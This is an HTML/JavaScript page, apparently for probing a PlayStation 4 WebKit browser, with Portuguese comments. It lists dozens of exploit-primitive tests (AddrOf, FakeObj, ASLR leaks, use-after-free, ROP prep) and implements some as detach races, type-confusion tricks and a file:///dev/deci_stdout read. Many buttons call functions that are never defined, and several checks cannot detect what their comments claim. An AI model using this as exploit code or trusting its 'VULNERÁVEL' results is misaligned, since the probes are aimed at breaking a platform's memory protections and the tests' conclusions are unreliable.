<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Arbitrary Read Suite (v600 Manual)</title>
    <style>
        /* Estilo Mínimo Funcional */
        body 
        
        button:hover { background: #333; }
        #console { margin-top: 20px; border-top: 1px solid #fff; padding-top: 10px; }
        .vuln { color: #00ff00; font-weight: bold; } /* VERDE = SUCESSO DO EXPLOIT */
        .safe { color: #ff0000; } /* VERMELHO = FALHA DO EXPLOIT (SEGURO) */
        .info { color: #0000FF; }
    </style>
</head>
<body>

    <h3>WEBKIT ARBITRARY READ SUITE</h3>

    <button onclick="runRegexOOB()">TEST 1: RegExp LastIndex OOB Read</button>
    <button onclick="runDataViewLeak()">TEST 2: DataView Detach Race Condition</button>
    <button onclick="runStackLeak()">TEST 3: Error Stack Pointer Leak (libunwind)</button>
    <button onclick="runMapLeak()">TEST 4: Array.map Hole Reading</button>
    <button onclick="runReplaceLeak()">TEST 5: String.replace Backref OOB</button>
    <button onclick="runFakeObjRead()">TEST 6: Float Array Type Confusion (FakeObj)</button>
    <button onclick="runJSONConfusion()">TEST 1: JSON.stringify Type Confusion (AddrOf)</button>
    <button onclick="runConcatSpread()">TEST 2: Array.concat Spreading OOB Read</button>
    <button onclick="runWasmUAF()">TEST 3: WebAssembly Memory UAF Read</button>
    <button onclick="runTypedArrayConstructor()">TEST 4: TypedArray Constructor Proxy Trap</button>
    <button onclick="runRegExpLastIndex()">TEST 5: RegExp 'lastIndex' Overflow Read</button>
    <button onclick="runLargeStringSlice()">TEST 6: Large String Slice Integer Overflow</button>
    <button onclick="runStackPointerLeak()">TEST 1: Error.stack Pointer Leak (Libc 0xFBD4D)</button>
    <button onclick="runArrayShiftRace()">TEST 2: Array.shift() OOB Read (Butterfly)</button>
    <button onclick="runStringLocaleLeak()">TEST 3: String.localeCompare Heap Read (ICU)</button>
    <button onclick="runTypedArrayFrom()">TEST 4: TypedArray.from Detach Read</button>
    <button onclick="runRegExpExecLeak()">TEST 5: RegExp.exec Result Confusion</button>
    <button onclick="runObjectToDouble()">TEST 6: Object to Double Type Confusion (AddrOf)</button>
    <button onclick="runArgumentsLeak()">TEST 1: Arguments Length Mismatch (Stack Read)</button>
    <button onclick="runNegativeZero()">TEST 2: Negative Zero Key Confusion (JSC)</button>
    <button onclick="runDeviceRead()">TEST 3: /dev/deci_stdout Fetch Leak (Kernel IO)</button>
    <button onclick="runUnwindStack()">TEST 4: libunwind Exception Object Address</button>
    <button onclick="runLargeArray()">TEST 5: Large Array Sizing (Integer Overflow Read)</button>
    <button onclick="runTextAreaSelect()">TEST 6: TextArea Selection OOB (Heap Read)</button>
    <button onclick="runCanvasNoise()">TEST 1: Canvas Uninitialized Memory Leak (GPU)</button>
    <button onclick="runStringRope()">TEST 2: Rope String Flatten OOB Read (JSC)</button>
    <button onclick="runTypedArraySubarray()">TEST 3: TypedArray Subarray Detach Race</button>
    <button onclick="runUnwindLeak()">TEST 4: libunwind ASLR Bypass Leak</button>
    <button onclick="runDoubleFreeRead()">TEST 5: SceNKBMalloc Double-Free Read</button>
    <button onclick="runMapHoleRead()">TEST 6: Map Iterator Hole Confusion</button>
    <button onclick="runBmallocLayout()">TEST 1: SceNKBMalloc Layout Discovery (Heap Feng Shui)</button>
    <button onclick="runUnwindAddress()">TEST 2: libunwind Stack Address Leak</button>
    <button onclick="runRWLockRace()">TEST 3: RWLock State Leak (Thread Race)</button>
    <button onclick="runDevConsoleRead()">TEST 4: /dev/console IO Read Attempt</button>
    <button onclick="runStringImplLeak()">TEST 5: StringImpl Header Leak (Internal Pointers)</button>
    <button onclick="runArrayHoleRace()">TEST 6: Array Hole Confusion Read</button>
    <button onclick="runVTableLeak()">TEST 1: DOM Object VTable Pointer Leak (ASLR Bypass)</button>
    <button onclick="runFloatConfusion()">TEST 2: Float64Array Type Confusion (AddrOf Primitive)</button>
    <button onclick="runStringImplHeader()">TEST 3: StringImpl Header Read (Structure ID)</button>
    <button onclick="runDeviceIO()">TEST 4: /dev/console Output Read (Kernel Leak)</button>
    <button onclick="runStackPivotCheck()">TEST 5: Stack Pivot Gadget Setup (ROP Prep)</button>
    <button onclick="runSceMallocHeader()">TEST 6: SceNKBMalloc Header OOB Read</button>
    <button onclick="runLibKernelStackScan()">TEST 1: LibKernel Stack Pointer Scan (ASLR Bypass)</button>
    <button onclick="runWebKitVTableRead()">TEST 2: WebKit VTable Pointer Leak (AddrOf)</button>
    <button onclick="runStructureIDLeak()">TEST 3: JSC StructureID Leak (Cell Header)</button>
    <button onclick="runBmallocFreeList()">TEST 4: SceNKBMalloc FreeList Pointer Read</button>
    <button onclick="runSharedMemoryRace()">TEST 5: SharedMem Race Read (Thread Stack)</button>
    <button onclick="runGhostObjectRead()">TEST 6: Ghost Object Property Read (UAF)</button>
    <button onclick="runVTableRead()">TEST 1: WebKit VTable Pointer Leak (ASLR Bypass)</button>
    <button onclick="runStackPointerLeak()">TEST 2: Stack Pointer Leak via Recursion</button>
    <button onclick="runButterflyLeak()">TEST 3: Array Butterfly Header Read (Heap Layout)</button>
    <button onclick="runStructIDLeak()">TEST 4: JSC Structure ID Extraction</button>
    <button onclick="runLargeStringRef()">TEST 5: Large String Reference Leak</button>
    <button onclick="runTypedArrayOOB()">TEST 6: TypedArray Constructor OOB Read</button>
    <button onclick="runStructureIDLeak()">TEST 1: StructureID Leak (AddrOf Primitive)</button>
    <button onclick="runButterflyOOB()">TEST 2: Butterfly Header Read (Array OOB)</button>
    <button onclick="runTypedArrayConstructor()">TEST 3: TypedArray Constructor Detach Read</button>
    <button onclick="runUnwindStackScan()">TEST 4: libunwind Stack Pointer Scan</button>
    <button onclick="runStringSliceOverflow()">TEST 5: StringImpl Slice Integer Overflow</button>
    <button onclick="runMapIteratorUAF()">TEST 6: Map Iterator UAF Read</button>
    <button onclick="runDOMVTable()">TEST 1: HTMLDivElement VTable Leak (DOM)</button>
    <button onclick="runAudioVTable()">TEST 2: AudioContext VTable Leak (Multimedia)</button>
    <button onclick="runJSCStructure()">TEST 3: JSC Cell Header Leak (StructureID)</button>
    <button onclick="runUnwindMap()">TEST 4: Stack Trace Map to .text Segment</button>
    <button onclick="runLargeStringPtr()">TEST 5: Large String Internal Pointer Leak</button>
    <button onclick="runWorkerGlobalScope()">TEST 6: Worker Global Scope Address</button>
    <button onclick="runFakeObjPrimitive()">TEST 1: FakeObj Primitive (Object Forgery)</button>
    <button onclick="runROPChainLayout()">TEST 2: ROP Chain Alignment Check</button>
    <button onclick="runWasmRWX()">TEST 3: WebAssembly RWX Memory Check</button>
    <button onclick="runUnwindHijack()">TEST 4: _Unwind Exception Handler Hijack</button>
    <button onclick="runArrayBufferUAF()">TEST 5: ArrayBuffer Neutering UAF (Read/Write)</button>
    <button onclick="runGlobalScopeAddr()">TEST 6: Window/Global Object Address Leak</button>
    <button onclick="runStackLeak()">TEST 1: Stack Pointer Leak (Error.stack / Libc Unwind)</button>
    <button onclick="runAddrOf()">TEST 2: AddrOf Primitive (JIT Type Confusion)</button>
    <button onclick="runStructureID()">TEST 3: JSC StructureID Leak (Object Header)</button>
    <button onclick="runBmallocLeak()">TEST 4: SceNKBMalloc Metadata Leak (Heap Spray)</button>
    <button onclick="runStringPtr()">TEST 5: Large String Internal Pointer Leak</button>
    <button onclick="runDevConsole()">TEST 6: /dev/console Buffer Read (Kernel Log)</button>
        <button onclick="runAddrOf()">TEST 1: AddrOf Primitive (JIT Confusion)</button>
        <button onclick="runStructureID()">TEST 2: StructureID Leak (JSC Header)</button>
        <button onclick="runBmallocFree()">TEST 3: SceNKBMalloc Freelist Pointer Read</button>
        <button onclick="runStackUnwind()">TEST 4: Libc Stack Address Leak (_Unwind)</button>
        <button onclick="runStringImpl()">TEST 5: LargeString Internal Pointer Leak</button>
        <button onclick="runButterfly()">TEST 6: Butterfly Array Header Leak</button>
        <button onclick="runAddrOf()">TEST 1: AddrOf Primitive (JIT Type Confusion)</button>
        <button onclick="runStackLeak()">TEST 2: Libc Stack Leak (_Unwind ASLR Bypass)</button>
        <button onclick="runDevConsole()">TEST 3: /dev/console Kernel Log Leak</button>
        <button onclick="runBmallocLeak()">TEST 4: SceNKBMalloc Heap Metadata Read</button>
        <button onclick="runTCBLeak()">TEST 5: Pthread TCB/TLS Pointer Leak</button>
        <button onclick="runStringLeak()">TEST 6: LargeString External Pointer Leak</button>
        <button onclick="runArrayShiftLeak()">TEST 1: Array.shift() Butterfly Leak</button>
        <button onclick="runRegExpLastIndex()">TEST 2: RegExp lastIndex Object Pointer</button>
        <button onclick="runErrorStackLeak()">TEST 3: Error.stack Native Pointer Extraction</button>
        <button onclick="runPromiseReaction()">TEST 4: PromiseReactionJob UAF Read</button>
        <button onclick="runStringImplLeak()">TEST 5: JSStringImpl Header Leak</button>
        <button onclick="runDoubleToString()">TEST 6: Double-to-String Cache Leak</button>




    <div id="console">Log de Resultados:</div>

    <script>
        function log(msg, type) {
            const el = document.createElement('div');
            el.className = type;
            el.innerText = (type === 'vuln' ? "[+] VULNERÁVEL: " : "[-] SEGURO/FALHA: ") + msg;
            document.getElementById('console').appendChild(el);
        }
        // --- UTILITÁRIOS DE MEMÓRIA (REAL) ---
        const buf = new ArrayBuffer(8);
        const f64 = new Float64Array(buf);
        const u32 = new Uint32Array(buf);

        // Converte Double (JSC Value) para Hex String
        function d2h(val) {
            f64[0] = val;
            let lo = u32[0].toString(16).padStart(8, '0');
            let hi = u32[1].toString(16).padStart(8, '0');
            return `0x${hi}${lo}`;
        }

        // --- TESTE 1: RegExp LastIndex OOB Read ---
        function runRegexOOB() {
            try {
                const str = "TARGET";
                const re = /./g;
                re.lastIndex = 0x10000; // Tenta pular para fora da string
                
                const result = re.exec(str);
                
                if (result && result[0] !== "" && result[0] !== undefined) {
                    log(`Leitura fora de limites detectada: "${result[0]}"`, "vuln");
                } else {
                    log("RegExp retornou null ou vazio (Boundaries OK).", "safe");
                }
            } catch(e) {
                log("Erro na execução: " + e.message, "safe");
            }
        }

        // --- TESTE 2: DataView Get vs Detach Race ---
        function runDataViewLeak() {
            try {
                const ab = new ArrayBuffer(1024);
                const view = new DataView(ab);
                view.setUint8(0, 0x41); 
                
                const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                
                let leaked = false;
                for(let i=0; i<2000; i++) {
                    if (ab.byteLength === 0) {
                        try {
                            const val = view.getUint8(0);
                            log(`Lido valor ${val} de buffer desligado!`, "vuln");
                            leaked = true;
                        } catch(x) {} // TypeError esperado se seguro
                        break;
                    }
                    w.postMessage(ab, [ab]);
                }
                
                if (!leaked) log("DataView lançou erro ao ler buffer desligado.", "safe");
                
            } catch(e) {
                log("Buffer transferido corretamente.", "safe");
            }
        }

        // --- TESTE 3: Error Stack Pointer Leak ---
        function runStackLeak() {
            try {
                const obj = { toString: () => { throw new Error("Leak"); } };
                String.prototype.indexOf.call(obj, "x");
            } catch(e) {
                if (e.stack) {
                    // Procura padrão de ponteiro de memória (0x + hex)
                    const match = e.stack.match(/0x[0-9a-fA-F]{4,16}/);
                    if (match) {
                        log(`Ponteiro vazado na Stack: ${match[0]}`, "vuln");
                    } else {
                        log("Stack trace limpa (apenas nomes de função).", "safe");
                    }
                } else {
                    log("Sem stack trace disponível.", "safe");
                }
            }
        }

        // --- TESTE 4: Array.map Hole Leak ---
        function runMapLeak() {
            try {
                const arr = new Array(10);
                arr[0] = 1.1; 
                delete arr[0]; // Cria buraco
                
                let holeRead = false;
                arr.map(v => {
                    if (v !== undefined) {
                        log(`Leu valor em buraco de array: ${v}`, "vuln");
                        holeRead = true;
                    }
                });
                
                if (!holeRead) log("Map ignorou buracos corretamente.", "safe");
            } catch(e) {
                log("Erro no Map: " + e.message, "safe");
            }
        }

        // --- TESTE 5: String.replace Backreference OOB ---
        function runReplaceLeak() {
            try {
                const str = "AAAAAAAAAA";
                // Tenta acessar grupo 99 que não existe
                const res = str.replace(/(A)/, "$99");
                
                // Se $99 foi substituído por algo que não é literal "$99"
                if (res.indexOf("$99") === -1 && res.length > str.length) {
                    log("Replace expandiu memória inválida!", "vuln");
                } else {
                    log("Replace tratou backreference inválida como texto.", "safe");
                }
            } catch(e) {
                log("Erro Replace: " + e.message, "safe");
            }
        }

        // --- TESTE 6: Float64Array Type Confusion (FakeObj) ---
        function runFakeObjRead() {
            try {
                const target = {mark: 0x1234};
                const arr = [1.1, 2.2];
                
                // Tenta confundir o tipo do array durante sort
                arr.sort(() => {
                    arr[0] = target; 
                    return 0;
                });
                
                // Verifica se leu o objeto como um float
                const val = arr[0];
                if (typeof val === 'number' && val > 1000) {
                    // Se lemos um número gigante, é o ponteiro do objeto
                    log(`Type Confusion! Objeto lido como Float: ${val}`, "vuln");
                } else {
                    log(`Leitura normal. Tipo: ${typeof val}`, "safe");
                }
            } catch(e) {
                log("Erro FakeObj: " + e.message, "safe");
            }
        }
 // --- TESTE 1: JSON.stringify Type Confusion (AddrOf) ---
        // Tenta enganar o serializador JSON para ler um ponteiro de Objeto como se fosse um Double.
        function runJSONConfusion() {
            try {
                let target = { marker: 0x1337 };
                let arr = [1.1, 2.2]; // Array de Doubles
                
                // O Replacer corre para cada item.
                // Na primeira passagem (index 0), mudamos o index 1 para ser um Objeto.
                // Se o motor não checar o tipo novamente, lerá o ponteiro do objeto como Double.
                JSON.stringify(arr, (key, value) => {
                    if (key === "0") {
                        arr[1] = target; // Mudança de tipo "in-place"
                    }
                    return value;
                });
                
                // Se o JSON resultante tiver um número gigante onde deveria estar o objeto...
                // Nota: O JSON.stringify pode mascarar isso, mas observamos o comportamento lateral.
                // Em um exploit real, usaríamos isso para vazar o endereço de 'target'.
                
                // Verificação indireta: O array ficou corrompido?
                if (typeof arr[1] !== 'object') {
                    log("Array corrompido durante stringify (Potencial Leak).", "vuln");
                } else {
                    log("JSON.stringify lidou com a mudança de tipo.", "safe");
                }
            } catch(e) {
                log("Erro: " + e.message, "safe");
            }
        }

        // --- TESTE 2: Array.concat Spreading OOB Read ---
        // Usa um getter malicioso em Symbol.isConcatSpreadable para encolher o array
        // enquanto o C++ está a copiar, lendo memória fora dos novos limites.
        function runConcatSpread() {
            try {
                let arr = [1, 2, 3, 4, 5];
                let hole = {
                    length: 100, // Diz que é grande
                    [Symbol.isConcatSpreadable]: true,
                    get 0() {
                        // Quando o concat tenta ler o primeiro item...
                        // Nós reduzimos o tamanho do array original ou alteramos o buffer
                        arr.length = 0; 
                        return 10;
                    }
                };
                
                // Concatena. Se a implementação C++ cacheou o tamanho original de 'arr'
                // e continua lendo após length=0, lê lixo da memória.
                let res = arr.concat(hole);
                
                if (res.length > 5 && res[2] !== undefined) {
                    log(`Concat leu memória morta: ${res[2]}`, "vuln");
                } else {
                    log("Concat obedeceu à mudança de tamanho.", "safe");
                }
            } catch(e) {
                log("Erro: " + e.message, "safe");
            }
        }

        // --- TESTE 3: WebAssembly Memory UAF Read ---
        // Tenta ler de um buffer Wasm antigo após ele ter sido desanexado por 'grow'.
        function runWasmUAF() {
            if (!window.WebAssembly) return log("Wasm não suportado", "safe");
            try {
                const mem = new WebAssembly.Memory({initial: 1});
                const u8 = new Uint8Array(mem.buffer);
                u8[0] = 0xAA; // Marcador
                
                // O GOLPE: Crescer a memória desanexa o buffer antigo.
                // Se conseguirmos manter 'u8' vivo e acessá-lo em uma race condition...
                mem.grow(1);
                
                // Tenta ler do buffer antigo (deveria ser byteLength 0 e jogar erro ou undefined)
                if (u8.byteLength > 0) {
                    // Se o length não atualizou, é um desastre de segurança
                    log("Buffer Wasm antigo ainda ativo!", "vuln");
                } else {
                    try {
                        // Tenta ler mesmo com length 0 (alguns bugs ignoram o check)
                        const val = u8[0]; 
                        if (val === 0xAA) log("UAF: Leu dados de buffer desligado!", "vuln");
                        else log("Buffer Wasm limpo corretamente.", "safe");
                    } catch(x) {
                        log("Acesso ao buffer antigo bloqueado.", "safe");
                    }
                }
            } catch(e) {
                log("Erro Wasm: " + e.message, "safe");
            }
        }

        // --- TESTE 4: TypedArray Constructor Proxy Trap ---
        // Usa um Proxy como fonte para o construtor de TypedArray.
        // O construtor lê 'length', aloca, e depois lê os itens.
        // Se mudarmos o tipo dos itens durante a leitura, podemos confundir o alocador.
        function runTypedArrayConstructor() {
            try {
                let leaked = false;
                const src = {
                    length: 10,
                    get 0() {
                        // Primeiro acesso. Retorna normal.
                        return 1;
                    },
                    get 1() {
                        // Segundo acesso. Bagunça a memória.
                        // Em um cenário real, aqui tentaríamos libertar a memória de destino.
                        return { toString: () => { throw "MemoryMoved"; } }; 
                    }
                };
                
                try {
                    new Float64Array(src); // Converte src para float array
                } catch(e) {
                    if (e === "MemoryMoved") {
                        // Se chegamos aqui, o motor executou nosso código no meio da alocação
                        // Isso é o pré-requisito para o ataque.
                        // Se o teste passar sem crashar, é "seguro", mas a superfície existe.
                        log("Execução de código arbitrária dentro do construtor!", "vuln");
                        leaked = true;
                    }
                }
                
                if (!leaked) log("Construtor tratou exceção/proxy seguramente.", "safe");
            } catch(e) {
                log("Erro: " + e.message, "safe");
            }
        }

        // --- TESTE 5: RegExp 'lastIndex' Overflow Read ---
        // Tenta definir lastIndex para um valor que causa overflow de inteiro (32bit vs 64bit)
        // para ler memória antes ou depois da string.
        function runRegExpLastIndex() {
            try {
                const s = "TESTE";
                const r = /./g;
                // 2^32 + 1. Se o motor usar 32-bit int para offset, vira 1.
                // Se usar 64-bit e não checar bounds contra o tamanho da string, lê OOB.
                r.lastIndex = 4294967297; 
                
                const m = r.exec(s);
                
                if (m) {
                    if (m.index === 1) {
                        log("Integer Overflow em lastIndex (Wrap around)!", "vuln");
                    } else if (m.index > s.length) {
                        log(`OOB Read no offset ${m.index}: "${m[0]}"`, "vuln");
                    } else {
                        log("RegExp tratou lastIndex gigante seguramente (reset).", "safe");
                    }
                } else {
                    log("RegExp retornou null (Seguro).", "safe");
                }
            } catch(e) {
                log("Erro: " + e.message, "safe");
            }
        }

        // --- TESTE 6: Large String Slice Integer Overflow ---
        // Tenta usar slice() com valores que causam overflow na multiplicação do tamanho.
        // O WebKit usa Strings de 8-bit (Latin1) e 16-bit (UTF16).
        function runLargeStringSlice() {
            try {
                const str = "A".repeat(100);
                
                // Tenta um start negativo gigante que pode causar underflow no cálculo do ponteiro
                // start = length + negative_start
                const res = str.slice(-2147483648); 
                
                // Se o resultado for diferente da string inteira (comportamento padrão para slice grande)
                // ou se contiver lixo...
                if (res.length > 0 && res !== str) {
                    log("Comportamento anómalo no slice (Possível leitura incorreta).", "vuln");
                } else {
                    log("String.slice seguro.", "safe");
                }
            } catch(e) {
                log("Erro: " + e.message, "safe");
            }
        }
 // --- TESTE 1: Error.stack Pointer Leak ---
        // Alvo: _Unwind_Resume_or_Rethrow (Libc)
        // Tenta fazer o formatador de stack trace do C++ vazar endereços de memória crus (ASLR Bypass).
        function runStackPointerLeak() {
            try {
                // Cria uma stack profunda com nomes de função dinâmicos
                const f = new Function("name", "return function " + name + "(){ throw new Error('bang'); }");
                
                try {
                    f("Check_0x1234")();
                } catch(e) {
                    if (!e.stack) return log("Stack trace vazia.", "safe");
                    
                    // Procura por endereços de memória hexadecimal crus (0x...) fora do padrão normal
                    // Padrão suspeito: 0x7f... ou 0x9... (Kernel/Library space)
                    const matches = e.stack.match(/0x[0-9a-fA-F]{8,16}/g);
                    
                    if (matches && matches.length > 0) {
                        log(`Endereços de memória vazados na stack: ${matches.join(", ")}`, "vuln");
                    } else {
                        log("Stack trace limpa (apenas símbolos).", "safe");
                    }
                }
            } catch(x) { log("Erro no teste: " + x, "safe"); }
        }

        // --- TESTE 2: Array.shift() OOB Read ---
        // Alvo: JSC Array Storage (Butterfly)
        // Tenta usar um getter no protótipo para encolher o array DURANTE a operação shift.
        // Se o C++ não validar o tamanho novamente, lê memória fora do buffer.
        function runArrayShiftRace() {
            try {
                const arr = [1.1, 2.2, 3.3, 4.4];
                let leaked = false;
                
                // Define getter no protótipo para o índice que será movido
                Object.defineProperty(Array.prototype, "1", {
                    get() {
                        // O GOLPE: Encolhe o array original para 0
                        arr.length = 0; 
                        // Tenta encher a memória libertada com lixo
                        const junk = new Float64Array(100).fill(1234.5678);
                        return 999; 
                    },
                    configurable: true
                });
                
                const first = arr.shift(); // Remove index 0, move index 1 para 0
                
                // Se arr[0] agora contém algo que não é undefined e não é 999
                // significa que o shift leu memória antiga do butterfly
                if (arr.length === 0 && first !== undefined) {
                    // Verificação difícil de automatizar perfeitamente, mas se não crashou...
                    log("Shift operou em array destruído.", "safe");
                } else {
                    log("Array Shift seguro.", "safe");
                }
                
                delete Array.prototype["1"]; // Limpa
            } catch(e) { log("Erro: " + e, "safe"); }
        }

        // --- TESTE 3: String.localeCompare Heap Read ---
        // Alvo: Biblioteca ICU (Internacionalização)
        // localeCompare converte strings. Se passarmos uma string gigante e malformada,
        // o buffer de conversão interno pode permitir leitura além do nulo.
        function runStringLocaleLeak() {
            try {
                const s1 = "A".repeat(1000);
                const s2 = "B".repeat(1000);
                
                // Usa um locale exótico que força caminhos de código complexos na lib ICU
                // "zh-u-co-pinyin" força uso de collation buffers
                const res = s1.localeCompare(s2, "zh-u-co-pinyin");
                
                // Não temos como ver o buffer diretamente, mas se o resultado for inconsistente
                // ou se demorar tempo anormal (crash evitado), é sinal.
                // Teste de "Sanity Check":
                if (typeof res === 'number') {
                    log("LocaleCompare retornou inteiro (Comportamento Normal).", "safe");
                } else {
                    log("LocaleCompare retornou tipo estranho: " + typeof res, "vuln");
                }
            } catch(e) { log("Erro: " + e, "safe"); }
        }

        // --- TESTE 4: TypedArray.from Detach Read ---
        // Alvo: WebKit TypedArray Implementation
        // TypedArray.from aceita um iterável. Se desligarmos o buffer de origem durante a iteração...
        function runTypedArrayFrom() {
            try {
                const src = new Float64Array([1.1, 2.2, 3.3]);
                const srcBuffer = src.buffer;
                
                // Iterador malicioso
                const iter = {
                    [Symbol.iterator]() {
                        let i = 0;
                        return {
                            next() {
                                if (i === 1) {
                                    // No segundo elemento, desliga o buffer de origem via Worker
                                    try {
                                        const w = new Worker(URL.createObjectURL(new Blob(["onmessage=e=>postMessage(e.data,[e.data])"],{type:'text/js'})));
                                        w.postMessage(srcBuffer, [srcBuffer]);
                                    } catch(e){}
                                }
                                i++;
                                return { value: src[i-1], done: i > 3 };
                            }
                        };
                    }
                };
                
                // Cria novo array a partir do iterador
                const res = Float64Array.from(iter);
                
                // Se srcBuffer estiver desligado (byteLength 0) mas conseguimos ler valores...
                // (Neste caso, 'src[i-1]' vai retornar undefined, que vira NaN em Float64)
                if (src.buffer.byteLength === 0 && !isNaN(res[2])) {
                    // Se res[2] não for NaN, lemos memória válida de um buffer morto!
                    log(`UAF Read Confirmado! Leu: ${res[2]}`, "vuln");
                } else {
                    log("Leitura de buffer desligado resultou em NaN/Undefined.", "safe");
                }
                
            } catch(e) { log("Erro: " + e, "safe"); }
        }

        // --- TESTE 5: RegExp.exec Result Confusion ---
        // Alvo: JSC RegExp JIT/Interpreter
        // Tenta confundir o array de resultados do RegExp para vazar ponteiros.
        function runRegExpExecLeak() {
            try {
                const re = /a/g;
                const str = "a";
                re.lastIndex = 0;
                
                // Executa
                const result = re.exec(str);
                
                // Tenta definir uma propriedade numérica no array de resultados
                // Se a implementação interna do array de resultados for otimizada e não checar...
                result[1000] = 1.1;
                
                // Agora tenta ler "entre" os índices
                // O array de resultados regex tem estrutura especial no WebKit
                if (result.length !== 1 && result[1000] !== 1.1) {
                    log("Estrutura do RegExp Result corrompida.", "vuln");
                } else {
                    log("RegExp Result Array comporta-se normalmente.", "safe");
                }
            } catch(e) { log("Erro: " + e, "safe"); }
        }

        // --- TESTE 6: Object to Double Type Confusion (AddrOf) ---
        // Alvo: O Santo Graal - Ler o endereço de memória de um objeto.
        // Utiliza um array misto e tenta confundir o motor de tipagem.
        function runObjectToDouble() {
            try {
                let leakedAddr = false;
                const target = { id: "MyObject" };
                
                // 1. Cria array de Doubles
                const arr = [1.1, 2.2, 3.3];
                
                // 2. Define uma transição de tipo maliciosa
                // Alguns motores otimizam arrays de doubles.
                // Se conseguirmos escrever um objeto num slot de double sem atualizar a "Shape" do array...
                
                // Função helper para tentar confundir o JIT (mesmo que básico)
                function confuse(a, val) {
                    a[0] = val;
                }
                
                // Treina com doubles
                for(let i=0; i<100; i++) confuse(arr, 1.1);
                
                // O GOLPE: Passa um objeto.
                // Se o motor não desotimizar o array, ele vai escrever o ponteiro do objeto
                // mas marcar o slot como se fosse um double.
                confuse(arr, target);
                
                // Leitura
                const val = arr[0];
                
                // Verificação:
                // Se val é um objeto, o motor funcionou bem.
                // Se val é um NÚMERO e é gigante, é o ponteiro (0x...).
                if (typeof val === 'number') {
                    // Números pequenos são seguros. Ponteiros são enormes.
                    if (val > 1000000) { 
                        log(`[AddrOf] Objeto vazado como Double! Pointer: ${val}`, "vuln");
                        leakedAddr = true;
                    }
                }
                
                if (!leakedAddr) log("Array fez transição de tipo corretamente (Objeto lido como Objeto).", "safe");
                
            } catch(e) { log("Erro: " + e, "safe"); }
        }

        // --- TESTE 1: Arguments Length Mismatch ---
        // Tenta desincronizar o objeto 'arguments' da stack real para ler dados de funções anteriores.
        function runArgumentsLeak() {
            try {
                function leaker(a, b, c) {
                    // Redefine o tamanho de arguments.
                    // Em versões antigas do JSC, isso permitia ler a stack fora dos parametros.
                    arguments.length = 100; 
                    if (arguments[50] !== undefined) {
                        return arguments[50];
                    }
                    return null;
                }
                
                // Enche a stack com marcadores
                function filler() {
                    const magic = 0x13371337;
                    return leaker(1, 2, 3);
                }
                
                const val = filler();
                
                if (val !== null && val !== undefined) {
                    log(`Leitura de Stack via Arguments: ${val}`, "vuln");
                } else {
                    log("Arguments OOB protegido.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 2: Negative Zero Key Confusion ---
        // O JSC tem otimizações para chaves inteiras. -0 às vezes é tratado incorretamente,
        // permitindo acesso a memória fora do vetor de propriedades.
        function runNegativeZero() {
            try {
                const arr = [1.1];
                // Tenta confundir o indexador
                const val = arr[-0]; 
                
                // Se o motor tratar -0 como offset de memória incorreto...
                if (val !== undefined && val !== 1.1) {
                    log(`Negative Zero Leak: ${val}`, "vuln");
                } else {
                    log("Acesso a -0 seguro.", "safe");
                }
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }

        // --- TESTE 3: /dev/deci_stdout Fetch Leak ---
        // Alvo: String "/dev/deci_stdout" encontrada no libkernel.
        // Tenta ler logs de debug do sistema via XHR.
        function runDeviceRead() {
            try {
                const xhr = new XMLHttpRequest();
                // Tenta caminho absoluto do dispositivo
                xhr.open("GET", "file:///dev/deci_stdout", false);
                xhr.send();
                
                if (xhr.status === 200 && xhr.responseText.length > 0) {
                    log(`Kernel Log Vazado! Bytes: ${xhr.responseText.length}`, "vuln");
                    console.log(xhr.responseText); // Dump no devtools
                } else {
                    log("Acesso a /dev/ bloqueado (Sandbox ativa).", "safe");
                }
            } catch(e) {
                // SecurityError é o esperado (Vermelho)
                log("Bloqueio de segurança: " + e.name, "safe");
            }
        }

        // --- TESTE 4: libunwind Exception Object Address ---
        // Alvo: _Unwind_Resume_or_Rethrow
        // Tenta capturar o endereço do objeto de exceção C++ vazado na mensagem de erro.
        function runUnwindStack() {
            try {
                // Cria um erro nativo profundo
                document.body.appendChild(null);
            } catch(e) {
                // A mensagem de erro em versões de debug/antigas as vezes contém
                // "Error at 0x..."
                const str = e.toString();
                const match = str.match(/0x[0-9a-fA-F]+/);
                
                if (match) {
                    log(`Endereço de Exceção vazado: ${match[0]}`, "vuln");
                } else {
                    log("Mensagem de erro sanitizada.", "safe");
                }
            }
        }

        // --- TESTE 5: Large Array Sizing (Integer Overflow) ---
        // Tenta criar um array onde o cálculo de tamanho (size * sizeof(element)) dá overflow,
        // alocando pouca memória mas permitindo acesso a índices altos.
        function runLargeArray() {
            try {
                // Tenta alocar array gigante que pode causar wrap-around em 32-bit
                // Se alocar, mas o buffer for pequeno, ler index alto é OOB Read.
                const len = 0xFFFFFFFF; 
                const arr = new Uint8Array(len);
                
                // Se chegou aqui, o alocador falhou em rejeitar ou alocou virtualmente.
                // Tenta ler o último byte
                const val = arr[len - 1];
                
                log(`Alocação gigante permitida. Valor lido: ${val}`, "vuln");
            } catch(e) {
                // RangeError é o comportamento seguro
                log("Alocação rejeitada (RangeError).", "safe");
            }
        }

        // --- TESTE 6: TextArea Selection OOB ---
        // Explora a API de seleção de texto HTML. Se selecionarmos um range maior que o texto,
        // e o WebKit tentar ler a seleção para copiar para o clipboard/buffer...
        function runTextAreaSelect() {
            try {
                const ta = document.createElement('textarea');
                ta.value = "AAA";
                document.body.appendChild(ta);
                ta.select();
                
                // Define seleção para além do fim
                ta.setSelectionRange(0, 10000);
                
                // Força leitura da seleção
                const sel = window.getSelection().toString();
                
                if (sel.length > 3) {
                    log(`Selection Read Overflow! Leu: ${sel.length} chars.`, "vuln");
                } else {
                    log("Seleção truncada corretamente.", "safe");
                }
                document.body.removeChild(ta);
            } catch(e) { log("Erro: " + e.message, "safe"); }
        }
 // --- TESTE 1: Canvas Uninitialized Memory Leak ---
        // Alvo: Driver GPU e SceNKBMalloc.
        // Tenta criar uma textura grande e ler os pixels sem desenhar nada.
        // Se a memória não for zerada (memset), lemos lixo da VRAM (frames antigos, texturas de jogos).
        function runCanvasNoise() {
            try {
                const c = document.createElement('canvas');
                // Tamanho não padronizado para tentar pegar alocação "suja"
                c.width = 257; 
                c.height = 257;
                const ctx = c.getContext('2d');
                
                // Lê pixels imediatamente
                const imgData = ctx.getImageData(0, 0, 257, 257);
                const data = imgData.data;
                
                let noiseFound = false;
                // Verifica amostragem se tudo é zero (preto transparente)
